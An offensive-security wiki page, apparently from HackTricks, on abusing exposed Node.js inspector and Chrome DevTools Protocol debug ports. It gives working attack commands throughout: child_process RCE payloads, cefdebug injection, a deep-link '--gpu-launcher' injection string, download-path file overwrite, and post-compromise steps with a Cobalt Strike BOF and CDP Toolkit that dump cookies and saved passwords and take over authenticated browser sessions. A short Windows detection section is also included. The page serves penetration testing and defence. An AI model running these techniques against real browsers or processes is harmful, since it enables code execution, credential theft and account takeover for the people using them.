# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Historical practical examples include the Multimaster walkthrough and the CVE-2019-1414 Visual Studio Code debugger attack; use them as version-specific context rather than assuming every current Electron or Chromium target exposes the same primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Basic Information

[From the docs](https://nodejs.org/learn/getting-started/debugging): When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.<sup>[[4]](#references)</sup>

Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).<sup>[[4]](#references)</sup>

There are several ways to start an inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

When you start an inspected process something like this will appear:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Processes based on **CEF** (**Chromium Embedded Framework**) can expose a debugger with `--remote-debugging-port=9222`. This exposes the browser through the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) rather than a Node.js inspector, so Node.js `process`-based payloads are not directly applicable by default.<sup>[[2]](#references)[[5]](#references)</sup>

When you start a debugged browser something like this will appear:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerating and driving a CDP endpoint

The HTTP discovery endpoints distinguish the **browser** WebSocket from individual **target** (tab, worker, extension, etc.) WebSockets. Query `/json/version` for the browser endpoint and `/json/list` for targets; the returned `webSocketDebuggerUrl` values can then be driven directly with CDP's JSON-RPC-like messages.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

For example, connect with `websocat "$BROWSER_WS"` and send `{"id":1,"method":"Target.getTargets"}` or `{"id":2,"method":"Storage.getCookies"}`. On a page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` executes in that renderer and `Page.captureScreenshot` returns a base64-encoded screenshot. `document.cookie` cannot reveal `HttpOnly` cookies, whereas `Storage.getCookies` asks the browser for its cookie store.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** precisely.<sup>[[4]](#references)</sup>

> [!TIP]
> This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).<sup>[[4]](#references)</sup>

### Starting inspector in running processes

You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.<sup>[[6]](#references)</sup>

### Connect to inspector/debugger

To connect to a **Chromium-based browser**, the `chrome://inspect` or `edge://inspect` URLs can be accessed for Chrome or Edge, respectively. By clicking the Configure button, it should be ensured that the **target host and port** are correctly listed. The image shows a Remote Code Execution (RCE) example:<sup>[[2]](#references)[[4]](#references)</sup>

![After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Connect to inspector/debugger: To connect to a Chromium-based browser ,...](<../../images/image (674).png>)

Using the **command line** you can connect to a debugger/inspector with:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Note that **NodeJS RCE exploits won't work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won't work in a connection to Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In this section I will just list interesting things I find people have used to exploit this protocol.

### Chrome 136+ default-profile restriction

Starting with **Chrome 136**, Chrome ignores `--remote-debugging-port` and `--remote-debugging-pipe` when they target the **default Chrome data directory**. The switch must be paired with a non-standard `--user-data-dir`, whose separate encryption key and isolated browser state prevent the simple flag-based technique from exposing the user's normal authenticated profile. This Chrome-specific restriction should not be assumed to cover older Chrome builds, Chrome for Testing, Electron/CEF applications, or other Chromium derivatives without verification.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Therefore, seeing a current Chrome process launched only with `--remote-debugging-port` does **not** prove that CDP became active. Confirm the listener and `/json/version`, and determine which profile actually backs it.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://index.html) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.<sup>[[8]](#references)</sup>

It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.<sup>[[8]](#references)</sup>

So, a payload like:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Will execute a calc.exe.<sup>[[8]](#references)</sup>

### Overwrite Files

Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE and exfiltration

STAR Labs showed that exposed WebDriver/CDP services can enable arbitrary file reads and RCE; DNS rebinding can complete the exploit chain in some configurations.<sup>[[9]](#references)</sup>

For additional historical browser-automation and Chromium security cases, see the Counter WebDriver write-up and Project Zero issues 773, 1742, and 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Enabling CDP inside a live Chromium process

Chrome's default-profile restriction only blocks the command-line activation path. With sufficient same-user access to manipulate the browser process, the original [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) and the Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) invoke Chromium's non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` inside the already-running `chrome.exe` or `msedge.exe`. The endpoint therefore belongs to the real profile, retaining its tabs, extensions, cookies and authenticated state.<sup>[[15]](#references)[[16]](#references)[[20]](#references)</sup>

For ordinary Chrome/Edge processes, the BOF finds the browser window and loaded `chrome.dll`/`msedge.dll`, scans the remote PE for masked signatures, allocates stubs and a context block, temporarily replaces the window procedure, and dispatches the final call on the browser **UI thread**. The relevant runtime inputs are `StartRemoteDebuggingServer`, Chromium's `operator new`, `TCPServerSocketFactory::CreateForHttpServer`, and the factory vtable; resolving Chromium's allocator avoids freeing an object allocated from the wrong heap. Execution stops unless each mandatory signature has a unique match.<sup>[[15]](#references)[[16]](#references)</sup>

The current BOF exposes these operator commands; `chrome-iso` is a separate path for Chrome's Windows Process Isolation boundary.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

The `chrome-iso` path avoids write/thread handles to the isolated process. It identifies the installed `chrome.dll` whose PE image size matches the live process, resolves symbols from that local image, and uses Chromium's `WindowImpl` dispatch plus synchronous `WM_COPYDATA` and an existing-image User32 hook to reach the UI thread.<sup>[[16]](#references)</sup>

> [!WARNING]
> This is a **post-compromise browser-process manipulation** technique, not an unauthenticated network bypass. It is build-dependent because the relevant C++ symbols are not exported and can change after browser updates.<sup>[[15]](#references)[[16]](#references)[[20]](#references)</sup>

#### Refreshing signatures after browser updates

Use the exact version of `chrome.dll` or `msedge.dll` installed on the target and its matching PDB. `symchk.exe` from the Windows SDK downloads the symbols; the repository scripts then locate `StartRemoteDebuggingServer`, derive the allocator/socket-factory inputs, or validate every signature embedded in the BOF.<sup>[[16]](#references)[[20]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

A zero-hit or multi-hit result must not be replaced with an arbitrary address. If a known `operator new` or `CreateForHttpServer` pattern changed too much to seed a new mask, use `pe_signature_finder.py` with the PDB to inspect that symbol and derive a byte sequence which is unique in the target module.<sup>[[16]](#references)[[20]](#references)</sup>

#### Authenticated-browser extraction with CDP Toolkit

This technique does not decrypt App-Bound Encryption (ABE) offline or remove device binding. It instead treats the legitimate browser as a **decryption oracle and authenticated interaction proxy**: `Storage.getCookies` asks the live browser for its cookie store, while navigation/screencast workflows keep requests, storage, enterprise authentication and device-bound behavior inside the victim's existing browser.<sup>[[17]](#references)[[20]](#references)</sup>

After routing the loopback CDP listener through the operator's pivot, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) can enumerate and collect common artifacts.<sup>[[17]](#references)[[20]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump`, and `tabs screenshot` are mostly wrappers around `/json/version`, the target list, `Storage.getCookies`, and `Page.captureScreenshot`. History, bookmarks, extensions and password metadata instead require a temporary `chrome://`/`edge://` WebUI target: the toolkit waits for the surface to render, inspects its model or DOM, collects the result, and closes the target.<sup>[[17]](#references)[[20]](#references)</sup>

`saved-passwords dump` goes further: it opens the real saved-login origin, focuses a credential field, selects the native autofill suggestion using CDP input events, and reads the populated values. The origin/port/path must closely match the saved-password realm; visible mode is the reliable default because the suggestion popup is native browser UI.<sup>[[17]](#references)[[20]](#references)</sup>

For live interaction, `browser-takeover screencast` streams frames and sends input to a real target (including background or off-screen modes). `browser-takeover proxy` instead accepts HTTP and HTTPS `CONNECT` locally and makes upstream requests through hidden Chrome targets, falling back to background tabs where hidden targets are unavailable; this preserves the victim's network/authentication context but is less faithful for complex client-side applications because the operator browser renders the returned content.<sup>[[17]](#references)[[20]](#references)</sup>

#### Detection on Windows

Sysmon Event ID **8** records `CreateRemoteThread`, while Event ID **10** records one process opening another and includes `GrantedAccess`. Correlate Event 8 targeting `chrome.exe`/`msedge.exe` with Event 10 from the same source process, user and time window; the observed `0x143a` mask includes `PROCESS_CREATE_THREAD` (`0x0002`), `PROCESS_VM_OPERATION` (`0x0008`), `PROCESS_VM_READ` (`0x0010`), **`PROCESS_VM_WRITE` (`0x0020`)**, `PROCESS_QUERY_INFORMATION` (`0x0400`) and `PROCESS_QUERY_LIMITED_INFORMATION` (`0x1000`). This is broader process-injection hunting rather than a unique CDP-Enable-BOF signature, so baseline legitimate browser-management, accessibility and security tooling.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

The Event 8/`0x143a` correlation targets the ordinary injection path; it may not cover `chrome-iso`, whose documented path requests only query-limited process handles and transfers execution through an existing-image User32 hook.<sup>[[16]](#references)</sup> Do not rely only on `--remote-debugging-*` command-line telemetry: also hunt for unusual browser-process handles/memory operations and unexpected loopback listeners owned by Chrome or Edge.<sup>[[15]](#references)[[20]](#references)</sup>

### Post-Exploitation

In a real environment and **after compromising** a user PC that uses a Chromium-based browser, a historical technique was to relaunch the browser with debugging enabled and forward the loopback port. This can expose the victim's browsing state on products/builds that still accept the selected profile, but Chrome 136+ will not honor this against its default data directory.<sup>[[7]](#references)[[14]](#references)</sup>

The original relaunch command is preserved below for older/version-specific targets. The second command is the supported current-Chrome form, but it creates an isolated profile rather than reopening the victim's normal authenticated state.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

For macOS-specific Chromium relaunch, extension, and CDP tradecraft, see [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecting CDP into a Running Edge Browser: A Deep Dive into Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [Microsoft - Process Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [19] [Microsoft Sysinternals - Sysmon event reference](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [20] [SpecterOps - Return of the Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
